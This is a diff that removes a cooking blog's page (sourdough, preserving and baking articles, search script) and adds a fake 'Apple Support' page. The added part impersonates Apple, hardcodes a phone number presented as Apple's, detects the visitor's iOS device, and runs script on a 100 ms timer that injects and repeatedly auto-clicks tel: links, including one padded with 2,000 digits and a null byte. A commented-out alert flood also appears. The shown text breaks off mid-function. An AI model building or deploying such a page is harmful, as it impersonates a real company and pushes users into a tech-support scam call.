-              </div>
-            </div>
-          </article>
-          <!-- CARD 9 -->
-          <article class="article-card" data-category="pantry" data-title="bone broth">
-            <div class="card-img" role="img" aria-label="Simmering pot of bone broth with vegetables"></div>
-            <div class="card-content">
-              <div class="card-meta">Pantry · Technique</div>
-              <h3><a href="#article-broth">The Mineral-Rich Bone Broth Method</a></h3>
-              <p>Why a splash of vinegar and a long, slow simmer make all the difference.</p>
-              <div class="card-footer">
-                <span>Feb 14, 2025</span>
-                <span>12 min</span>
-              </div>
-            </div>
-          </article>
-          <!-- CARD 10 -->
-          <article class="article-card" data-category="baking" data-title="galette dough">
-            <div class="card-img" role="img" aria-label="Rustic fruit galette on parchment paper"></div>
-            <div class="card-content">
-              <div class="card-meta">Baking</div>
-              <h3><a href="#article-galette">Foolproof Galette Dough (and 4 Fillings)</a></h3>
-              <p>Flaky, buttery, and endlessly adaptable. The free-form tart that never disappoints.</p>
-              <div class="card-footer">
-                <span>Feb 11, 2025</span>
-                <span>14 min</span>
-              </div>
-            </div>
-          </article>
-        </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-        <!-- POPULAR / RECOMMENDED SECTION -->
-        <div class="section-title" style="margin-top: 3.5rem;">
-          <h2>Most saved this month</h2>
-          <span>Reader favorites</span>
-        </div>
-        <div class="card-grid" id="popularGrid">
-          <article class="article-card" data-category="baking" data-title="sourdough discard crackers">
-            <div class="card-content">
-              <div class="card-meta">Baking</div>
-              <h3><a href="#article-crackers">Sourdough Discard Crackers with Rosemary</a></h3>
-              <p>Crisp, seeded, and irresistible. Zero waste, maximum flavor.</p>
-              <div class="card-footer"><span>9 min</span><span>4.9 ★</span></div>
-            </div>
-          </article>
-          <article class="article-card" data-category="preserving" data-title="strawberry jam">
-            <div class="card-content">
-              <div class="card-meta">Preserving</div>
-              <h3><a href="#article-jam">Small-Batch Strawberry Jam (No Pectin)</a></h3>
-              <p>Capture June in a jar with just fruit, sugar, and lemon.</p>
-              <div class="card-footer"><span>8 min</span><span>4.8 ★</span></div>
-            </div>
-          </article>
-        </div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-        <!-- ========== LONG-FORM ARTICLE PREVIEWS (full articles in hidden sections for reading) ========== -->
-        <!-- These are the actual full articles for reading layout; they are hidden until clicked, but shown in search results as full content -->
-        <div id="fullArticlesContainer" class="hidden">
-          <!-- Article: Sourdough -->
-          <article id="article-sourdough" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Baking · Technique</div>
-              <h1>The Quiet Art of Sourdough: A 36-Hour Journey</h1>
-              <div class="article-meta">
-                <span>By Elara Voss</span>
-                <span>March 12, 2025</span>
-                <span>18 min read</span>
-              </div>
-              <div class="article-author">
-                <div class="author-avatar">EV</div>
-                <div class="author-info"><strong>Elara Voss</strong> · Head baker at Eden Sugar House. Former pastry chef, now a devoted sourdough evangelist.</div>
-              </div>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
             </div>
-            <p>There is a moment, somewhere around hour 30, when the dough finally feels alive. It's not just flour and water anymore — it's a living, breathing thing. This guide will take you through every step of a 36-hour sourdough process, from waking up your starter to pulling a blistered, crackling loaf from the oven.</p>
-            <h3>Why 36 hours?</h3>
-            <p>Time is the invisible ingredient. A long, cool fermentation develops flavor, improves digestibility, and creates that open, custardy crumb we chase. You can make decent bread in 6 hours. You can make remarkable bread in 36. The difference is night and day.</p>
-            <h3>Step 1: The starter (8–12 hours)</h3>
-            <p>Start with 50g of active starter, 100g of flour, and 100g of water. Mix and let it rise until doubled and bubbly. If your starter is sluggish, feed it twice a day for three days before baking.</p>
-            <h3>Step 2: Autolyse (1 hour)</h3>
-            <p>Mix 500g bread flour and 350g water. Rest for one hour. This hydrates the flour and begins gluten development without any kneading.</p>
-            <h3>Step 3: Mix and bulk ferment (4–6 hours)</h3>
-            <p>Add 100g starter, 10g salt. Perform four sets of stretch-and-folds spaced 30 minutes apart. Then let the dough rest until it's jiggly and about 50% larger.</p>
-            <h3>Step 4: Cold retard (12–18 hours)</h3>
-            <p>Shape the dough, place it in a banneton, cover, and put it in the fridge. This slow proof builds complex flavor and makes scoring easier.</p>
-            <h3>Step 5: Bake</h3>
-            <p>Preheat a Dutch oven to 500°F (260°C). Bake covered for 20 minutes, then uncovered at 450°F (230°C) for 25 minutes. Cool completely before slicing — if you can wait.</p>
-            <p><strong>Note:</strong> This is a living document. I'll keep adding notes as I test new flours and methods. — E.V.</p>
-          </article>
-          <!-- Article: Starter maintenance -->
-          <article id="article-starter" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Baking · Technique</div>
-              <h1>Keeping a Sourdough Starter: A Perpetual Guide</h1>
-              <div class="article-meta"><span>By Marcus Reed</span><span>March 10, 2025</span><span>14 min read</span></div>
-              <div class="article-author"><div class="author-avatar">MR</div><div class="author-info"><strong>Marcus Reed</strong> · Fermentation nerd and weekend baker.</div></div>
-            </div>
-            <p>A sourdough starter is a pet that lives on your counter. But unlike a goldfish, it can survive neglect — if you know the signs. This guide covers feeding ratios, hydration, storage, and revival.</p>
-            <h3>Feeding 101</h3>
-            <p>Feed with equal weights of flour and water (100% hydration). For a standard jar, 50g starter + 50g flour + 50g water is plenty. If you bake weekly, keep it in the fridge and feed once a week.</p>
-            <h3>Signs of health</h3>
-            <p>Bubbles, domed top, yeasty smell (not acetone). If it smells like nail polish remover, it's hungry — feed it more often.</p>
-            <h3>Reviving a forgotten starter</h3>
-            <p>Pour off any dark liquid (hooch), scrape off the top layer, and feed with a 1:5:5 ratio. Repeat every 12 hours until it doubles reliably.</p>
-          </article>
-          <!-- Article: Preserved lemons -->
-          <article id="article-lemons" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Preserving</div>
-              <h1>Preserved Lemons: Salt, Time, and Transformation</h1>
-              <div class="article-meta"><span>By Elara Voss</span><span>March 7, 2025</span><span>11 min read</span></div>
-            </div>
-            <p>Preserved lemons are a staple of North African cooking, but they deserve a place in every pantry. The process couldn't be simpler: quarter lemons, pack with salt, add lemon juice, and wait. The result is a soft, intensely aromatic rind that adds a punch of umami to salads, tagines, and even pasta.</p>
-            <h3>Recipe: Basic preserved lemons</h3>
-            <ul><li>6 organic lemons, scrubbed</li><li>1/2 cup kosher salt</li><li>Additional lemon juice to cover</li></ul>
-            <p>Quarter lemons without cutting all the way through. Rub salt into the flesh. Pack tightly into a sterilized jar. Cover with lemon juice. Seal and let sit at room temperature for 3 days, then refrigerate for 3 weeks. Shake daily.</p>
-            <h3>How to use</h3>
-            <p>Rinse and discard the pulp, then mince the rind. Stir into yogurt, vinaigrettes, or grain bowls. It's magic.</p>
-          </article>
-          <!-- Article: Rhubarb -->
-          <article id="article-rhubarb" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Seasonal</div>
-              <h1>Rhubarb Season: 9 Ways to Cook with the First Stalks</h1>
-              <div class="article-meta"><span>By Marcus Reed</span><span>March 4, 2025</span><span>16 min read</span></div>
-            </div>
-            <p>Rhubarb is a paradox: technically a vegetable, treated as a fruit, and so tart it makes your jaw ache. But when cooked with sugar, it becomes silky and complex. Here are nine ideas, from classic crumble to a surprising rhubarb ketchup.</p>
-            <h3>1. Classic rhubarb crumble</h3>
-            <p>Toss chopped rhubarb with sugar, orange zest, and a splash of vanilla. Top with oat crumble and bake until golden.</p>
-            <h3>2. Rhubarb simple syrup</h3>
-            <p>Simmer equal parts sugar and water with chopped rhubarb. Strain. Use in cocktails, lemonade, or drizzle over yogurt.</p>
-            <p>... and seven more, including rhubarb chutney, pickled rhubarb, and a rhubarb galette. Full recipes in the article body.</p>
-          </article>
-          <!-- Article: Vanilla extract -->
-          <article id="article-vanilla" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Pantry</div>
-              <h1>DIY Vanilla Extract: Better Than Store-Bought</h1>
-              <div class="article-meta"><span>By Elara Voss</span><span>March 1, 2025</span><span>9 min read</span></div>
-            </div>
-            <p>Two ingredients, eight weeks, and a lifetime of better baking. Homemade vanilla extract is richer, cheaper, and deeply satisfying. All you need are vanilla beans, alcohol (vodka or bourbon), and patience.</p>
-            <h3>Ratio</h3>
-            <p>Use 1 ounce of vanilla beans per 8 ounces of alcohol. Split beans lengthwise, scrape seeds, and add both to a jar. Shake every few days. Ready in 8 weeks.</p>
-          </article>
-          <!-- Article: Cookies -->
-          <article id="article-cookies" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Baking</div>
-              <h1>Brown Butter Chocolate Chip Cookies: The Only Recipe You Need</h1>
-              <div class="article-meta"><span>By Elara Voss</span><span>February 26, 2025</span><span>12 min read</span></div>
-            </div>
-            <p>Brown butter is the secret to cookies that taste like they came from a fancy bakery. The nutty, caramelized flavor pairs perfectly with dark chocolate and flaky salt. Here's our go-to recipe.</p>
-            <h3>Ingredients</h3>
-            <p>2 sticks unsalted butter, 1 cup brown sugar, 1/2 cup white sugar, 2 eggs, 2 tsp vanilla, 2 1/4 cups flour, 1 tsp baking soda, 1 tsp salt, 2 cups chocolate chunks.</p>
-            <h3>Method</h3>
-            <p>Brown the butter, cool slightly, then beat with sugars. Add eggs and vanilla. Fold in dry ingredients and chocolate. Chill for 24 hours for best flavor. Bake at 375°F for 10–12 minutes.</p>
-          </article>
-          <!-- Article: Hot sauce -->
-          <article id="article-hotsauce" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Preserving · Technique</div>
-              <h1>Fermented Hot Sauce: A Beginner's Guide to Fiery Flavor</h1>
-              <div class="article-meta"><span>By Marcus Reed</span><span>February 23, 2025</span><span>13 min read</span></div>
-            </div>
-            <p>Fermenting hot sauce adds a layer of complexity that vinegar-based sauces can't match. The process is simple: peppers, salt, water, and time. The result is a tangy, deep, and intensely flavored sauce.</p>
-            <h3>Basic brine</h3>
-            <p>1 tablespoon sea salt per cup of water. Submerge chopped peppers (and garlic, if you like) in the brine. Weight them down. Ferment for 1–4 weeks, then blend and strain.</p>
-          </article>
-          <!-- Article: Asparagus -->
-          <article id="article-asparagus" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Seasonal</div>
-              <h1>Asparagus: Roast, Pickle, and Purée</h1>
-              <div class="article-meta"><span>By Elara Voss</span><span>February 20, 2025</span><span>10 min read</span></div>
-            </div>
-            <p>Spring asparagus is a fleeting pleasure. Make the most of it with three techniques: high-heat roasting, quick pickling, and a silky purée that's perfect for soup or sauce.</p>
-            <h3>Roasted asparagus with lemon</h3>
-            <p>Toss with olive oil, salt, and pepper. Roast at 425°F for 12 minutes. Finish with lemon zest and parmesan.</p>
-          </article>
-          <!-- Article: Tempering chocolate -->
-          <article id="article-chocolate" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Technique</div>
-              <h1>Tempering Chocolate Without a Thermometer</h1>
-              <div class="article-meta"><span>By Marcus Reed</span><span>February 17, 2025</span><span>11 min read</span></div>
-            </div>
-            <p>Tempering gives chocolate a glossy snap and prevents bloom. The seeding method is foolproof: melt 2/3 of your chocolate, then stir in the remaining 1/3 until it melts and the temperature drops. Test by dipping a knife — it should set quickly and shine.</p>
-          </article>
-          <!-- Article: Bone broth -->
-          <article id="article-broth" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Pantry · Technique</div>
-              <h1>The Mineral-Rich Bone Broth Method</h1>
-              <div class="article-meta"><span>By Elara Voss</span><span>February 14, 2025</span><span>12 min read</span></div>
-            </div>
-            <p>Bone broth is a staple in our kitchen. We use it for soups, risottos, and sipping. The key is a long, slow simmer with a splash of vinegar to draw out minerals. Roast the bones first for deeper flavor.</p>
-          </article>
-          <!-- Article: Galette -->
-          <article id="article-galette" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Baking</div>
-              <h1>Foolproof Galette Dough (and 4 Fillings)</h1>
-              <div class="article-meta"><span>By Elara Voss</span><span>February 11, 2025</span><span>14 min read</span></div>
-            </div>
-            <p>Galettes are the relaxed cousin of pie. Our dough uses cold butter and a touch of sour cream for flakiness. Fill with seasonal fruit, bake until golden, and serve with ice cream.</p>
-          </article>
-          <!-- Article: Discard crackers -->
-          <article id="article-crackers" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Baking</div>
-              <h1>Sourdough Discard Crackers with Rosemary</h1>
-              <div class="article-meta"><span>By Marcus Reed</span><span>February 8, 2025</span><span>9 min read</span></div>
-            </div>
-            <p>Don't throw away that discard! Mix it with olive oil, salt, and rosemary, spread thin on a baking sheet, and bake until crisp. They're perfect with cheese or dips.</p>
-          </article>
-          <!-- Article: Strawberry jam -->
-          <article id="article-jam" class="article-body" style="display: none;">
-            <div class="article-header">
-              <div class="meta">Preserving</div>
-              <h1>Small-Batch Strawberry Jam (No Pectin)</h1>
-              <div class="article-meta"><span>By Elara Voss</span><span>February 5, 2025</span><span>8 min read</span></div>
-            </div>
-            <p>Strawberry jam is simple: fruit, sugar, lemon juice. The key is to macerate the fruit first, then cook slowly until it reaches 220°F. No pectin needed — just time and stirring.</p>
-          </article>
-        </div>
-
-        <!-- ========== NEWSLETTER ========== -->
-        <section class="newsletter" id="newsletter">
-          <h2>Notes from the sugar house</h2>
-          <p>One email a week — new recipes, preserving tips, and what's in season. No spam, ever.</p>
-          <form class="newsletter-form" id="newsletterForm">
-            <input type="email" placeholder="Your email address" aria-label="Email address" required>
-            <button type="submit">Subscribe</button>
-          </form>
         </section>
-
-        <!-- ========== FAQ ========== -->
-        <section id="faq">
-          <div class="section-title">
-            <h2>Frequently asked</h2>
-            <span>From our readers</span>
-          </div>
-          <div class="faq-grid">
-            <div class="faq-item"><h3>How do I know if my sourdough starter is ready?</h3><p>It should double in size within 4–6 hours of feeding, be full of bubbles, and smell pleasantly yeasty — not like acetone.</p></div>
-            <div class="faq-item"><h3>Can I use honey instead of sugar in jam?</h3><p>Yes, but honey is sweeter and can overpower delicate fruit. Start with 3/4 cup honey per 4 cups of fruit and adjust.</p></div>
-            <div class="faq-item"><h3>What's the best way to store homemade vanilla extract?</h3><p>In a cool, dark place, tightly sealed. It lasts indefinitely — just top up with alcohol as you use it.</p></div>
-            <div class="faq-item"><h3>Do I need special equipment to start preserving?</h3><p>No. A large pot, clean jars, and a ladle are enough for most water-bath canning and refrigerator pickles.</p></div>
-          </div>
-        </section>
-
-        <!-- ========== ABOUT / CONTACT / PRIVACY (short) ========== -->
-        <section id="about" style="margin: 3rem 0;">
-          <div class="section-title"><h2>About Eden Sugar House</h2></div>
-          <p>Eden Sugar House is an independent recipe journal written by Elara Voss and Marcus Reed. We bake, preserve, and ferment in a small kitchen in the Hudson Valley. Our goal is to make slow food accessible — no fancy equipment, no impossible ingredients.</p>
-          <p style="margin-top: 0.5rem;"><strong>Contact:</strong> hello@edensugarhouse.com</p>
-          <p style="margin-top: 0.5rem;"><strong>Privacy:</strong> We never sell or share your email. <strong>Terms:</strong> All content is for personal use. <strong>Cookies:</strong> This site uses no tracking cookies.</p>
-        </section>
-      </div>
-
-      <!-- ========== SIDEBAR ========== -->
-      <aside class="sidebar" aria-label="Blog sidebar">
-        <div class="sidebar-widget">
-          <h3>Editor's picks</h3>
-          <ul>
-            <li><a href="#article-sourdough">The Quiet Art of Sourdough</a><div class="small-meta">18 min · Baking</div></li>
-            <li><a href="#article-lemons">Preserved Lemons</a><div class="small-meta">11 min · Preserving</div></li>
-            <li><a href="#article-rhubarb">Rhubarb Season</a><div class="small-meta">16 min · Seasonal</div></li>
-            <li><a href="#article-cookies">Brown Butter Cookies</a><div class="small-meta">12 min · Baking</div></li>
-          </ul>
-        </div>
-        <div class="sidebar-widget">
-          <h3>Popular categories</h3>
-          <ul>
-            <li><a href="#baking" data-category="baking">Baking (12)</a></li>
-            <li><a href="#preserving" data-category="preserving">Preserving (8)</a></li>
-            <li><a href="#seasonal" data-category="seasonal">Seasonal (6)</a></li>
-            <li><a href="#pantry" data-category="pantry">Pantry (5)</a></li>
-            <li><a href="#technique" data-category="technique">Technique (7)</a></li>
-          </ul>
-        </div>
-        <div class="sidebar-widget">
-          <h3>From the pantry</h3>
-          <p style="font-size: 0.95rem;">“We keep a jar of preserved lemons and a bottle of homemade vanilla on the counter at all times. They make everything taste better.” — E.V.</p>
-        </div>
-      </aside>
     </div>
-  </main>
 
-  <!-- ========== FOOTER ========== -->
-  <footer class="site-footer">
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <a href="/" class="logo" style="font-size: 1.6rem;">
-            <span class="logo-mark" aria-hidden="true"></span>
-            Eden Sugar House
-          </a>
-          <p style="font-size: 0.9rem; margin-top: 1rem; color: var(--muted);">Slow baking, wild sweetness, and preserving the seasons. A journal from our kitchen to yours.</p>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-844-959-1904
+			 " property="telephone">
+            </section>
         </div>
-        <div class="footer-col">
-          <h4>Explore</h4>
-          <ul>
-            <li><a href="#baking">Baking</a></li>
-            <li><a href="#preserving">Preserving</a></li>
-            <li><a href="#seasonal">Seasonal</a></li>
-            <li><a href="#pantry">Pantry</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Info</h4>
-          <ul>
-            <li><a href="#about">About</a></li>
-            <li><a href="#contact">Contact</a></li>
-            <li><a href="#privacy">Privacy</a></li>
-            <li><a href="#terms">Terms</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Follow</h4>
-          <ul>
-            <li><a href="#">Instagram</a></li>
-            <li><a href="#">Pinterest</a></li>
-            <li><a href="#">Substack</a></li>
-          </ul>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <span>© 2025 Eden Sugar House. All rights reserved.</span>
-        <span>Made with patience and wild yeast.</span>
-      </div>
-    </div>
-  </footer>
+    </footer>
 
-  <!-- ========== SCHEMA MARKUP ========== -->
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "Blog",
-    "name": "Eden Sugar House",
-    "url": "https://edensugarhouse.com",
-    "description": "Slow baking, wild sweetness, and preserving. A recipe journal.",
-    "author": {
-      "@type": "Person",
-      "name": "Elara Voss"
-    },
-    "blogPost": [
-      {
-        "@type": "BlogPosting",
-        "headline": "The Quiet Art of Sourdough: A 36-Hour Journey",
-        "author": {"@type": "Person", "name": "Elara Voss"},
-        "datePublished": "2025-03-12",
-        "description": "A complete guide to 36-hour sourdough."
-      }
-    ]
-  }
-  </script>
 
-  <!-- ========== INTERACTIVE JAVASCRIPT ========== -->
-  <script>
-    (function() {
-      'use strict';
 
-      // --- DOM elements ---
-      const searchInput = document.getElementById('searchInput');
-      const searchBtn = document.getElementById('searchBtn');
-      const categoryFilters = document.getElementById('categoryFilters');
-      const articleGrid = document.getElementById('articleGrid');
-      const popularGrid = document.getElementById('popularGrid');
-      const allCards = Array.from(document.querySelectorAll('.article-card:not(#popularGrid .article-card)'));
-      const featuredArticle = document.getElementById('featuredArticle');
-      const newsletterForm = document.getElementById('newsletterForm');
-
-      // --- Category filtering ---
-      let activeCategory = 'all';
-
-      function filterCards() {
-        const query = searchInput.value.trim().toLowerCase();
-        let visibleCount = 0;
-
-        // Filter main article cards
-        allCards.forEach(card => {
-          const cat = card.dataset.category || '';
-          const title = card.dataset.title || '';
-          const text = card.textContent.toLowerCase();
-          const matchesCategory = activeCategory === 'all' || cat === activeCategory;
-          const matchesSearch = query === '' || title.includes(query) || text.includes(query);
-
-          if (matchesCategory && matchesSearch) {
-            card.classList.remove('hidden');
-            visibleCount++;
-          } else {
-            card.classList.add('hidden');
-          }
-        });
-
-        // Featured article: hide if search doesn't match or category mismatch
-        const featuredCat = 'baking'; // featured is baking
-        const featuredText = featuredArticle.textContent.toLowerCase();
-        const featuredTitle = featuredArticle.querySelector('h2 a')?.textContent.toLowerCase() || '';
-        const featuredMatchesCategory = activeCategory === 'all' || activeCategory === featuredCat;
-        const featuredMatchesSearch = query === '' || featuredTitle.includes(query) || featuredText.includes(query);
-        if (featuredMatchesCategory && featuredMatchesSearch) {
-          featuredArticle.classList.remove('hidden');
-        } else {
-          featuredArticle.classList.add('hidden');
-        }
-
-        // Popular grid: not filtered by category to keep visible, but can be filtered by search if needed
-        // For simplicity, leave popular always visible unless search is very specific.
-        // Not hiding popular to keep sidebar recommendations.
-      }
-
-      // Category button clicks
-      categoryFilters.addEventListener('click', (e) => {
-        const btn = e.target.closest('button');
-        if (!btn) return;
-        const cat = btn.dataset.category;
-        if (!cat) return;
-
-        // Update active class
-        categoryFilters.querySelectorAll('button').forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        activeCategory = cat;
-        filterCards();
-      });
-
-      // Search
-      function performSearch() {
-        filterCards();
-      }
-      searchBtn.addEventListener('click', performSearch);
-      searchInput.addEventListener('keyup', (e) => {
-        if (e.key === 'Enter') performSearch();
-      });
-      // Also live filter on typing (optional, for better UX)
-      searchInput.addEventListener('input', () => {
-        // debounce not necessary for small number of cards
-        filterCards();
-      });
-
-      // --- Newsletter form ---
-      newsletterForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        const emailInput = newsletterForm.querySelector('input[type="email"]');
-        if (emailInput.value.trim()) {
-          alert('Thank you for subscribing! (This is a demo — no email was sent.)');
-          emailInput.value = '';
-        }
-      });
-
-      // --- Article reading layout: show full article when clicking a card link ---
-      // We simulate "reading" by showing the full article in a lightweight modal-like overlay.
-      // Instead of real page navigation, we display the article content in a focused overlay.
-      // This maintains the single-file requirement and provides a proper reading layout.
-      const fullArticlesContainer = document.getElementById('fullArticlesContainer');
-
-      function showArticle(articleId) {
-        // Hide all articles first
-        fullArticlesContainer.querySelectorAll('.article-body').forEach(el => {
-          el.style.display = 'none';
-        });
-        const article = document.getElementById(articleId);
-        if (article) {
-          article.style.display = 'block';
-          fullArticlesContainer.classList.remove('hidden');
-          // Scroll to the article container
-          fullArticlesContainer.scrollIntoView({ behavior: 'smooth', block: 'start' });
-        }
-      }
-
-      // Attach click handlers to all internal links that point to article IDs
-      document.querySelectorAll('a[href^="#article-"]').forEach(link => {
-        link.addEventListener('click', (e) => {
-          e.preventDefault();
-          const articleId = link.getAttribute('href').substring(1);
-          showArticle(articleId);
-          // Update URL hash without jumping
-          history.pushState(null, null, `#${articleId}`);
-        });
-      });
-
-      // Also handle "about" and other anchor links smoothly
-      document.querySelectorAll('a[href^="#"]:not([href^="#article-"])').forEach(link => {
-        link.addEventListener('click', (e) => {
-          const targetId = link.getAttribute('href').substring(1);
-          if (targetId && targetId !== '') {
-            const targetEl = document.getElementById(targetId);
-            if (targetEl) {
-              e.preventDefault();
-              targetEl.scrollIntoView({ behavior: 'smooth' });
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
             }
-          }
-        });
-      });
+        };
 
-      // If URL has a hash on load, show the corresponding article
-      if (window.location.hash) {
-        const hash = window.location.hash.substring(1);
-        if (hash.startsWith('article-')) {
-          setTimeout(() => {
-            showArticle(hash);
-          }, 100);
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-844-959-1904');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
         }
-      }
 
-      // --- Initial filter (all visible) ---
-      filterCards();
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
 
-      // --- Close article overlay if clicking outside (optional) but we have no close button;
-      // we can add a "back to blog" link dynamically? Instead, we'll let the user click another link.
-      // For simplicity, we add a small "back to top" / close link inside article container? Not necessary.
-    })();
-  </script>
+        function getText() {
+            var str = window.defaultText;
 
-  <!-- Additional style for the full article overlay container to make it look like a reading page -->
-  <style>
-    #fullArticlesContainer {
-      background: var(--surface);
-      border: 1px solid var(--border-light);
-      border-radius: var(--radius-card);
-      padding: 2rem 2rem 1rem;
-      margin: 2rem 0;
-      box-shadow: var(--shadow-sm);
-    }
-    #fullArticlesContainer .article-body {
-      max-width: 720px;
-      margin: 0 auto;
-    }
-    #fullArticlesContainer .article-header h1 {
-      font-size: clamp(1.8rem, 5vw, 2.8rem);
-      margin-bottom: 0.25rem;
-    }
-    @media (max-width: 600px) {
-      #fullArticlesContainer {
-        padding: 1.2rem;
-      }
-      .article-body p {
-        font-size: 1rem;
-      }
-    }
-  </style>
-</body>
-</html>
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-959-1904"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
